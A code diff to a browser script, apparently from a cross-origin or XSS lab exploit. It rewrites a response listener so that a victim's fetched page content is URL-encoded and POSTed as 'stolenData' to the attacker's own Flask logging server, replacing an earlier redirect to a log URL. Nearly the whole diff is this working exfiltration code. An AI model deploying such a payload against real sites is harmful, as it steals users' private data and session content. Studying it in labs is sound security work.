@@ -10,6 +10,17 @@
 
     function reqListener() {
         var response = encodeURIComponent(this.responseText);
-        location = 'log?key=' + response;  
+        
+        // Send the response to your Flask server
+        fetch('http://localhost:8080/log', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({ stolenData: response })
+        })
+        .then(res => res.json())
+        .then(data => console.log(data))
+        .catch(err => console.error('Error sending data:', err));
     }
 </script>
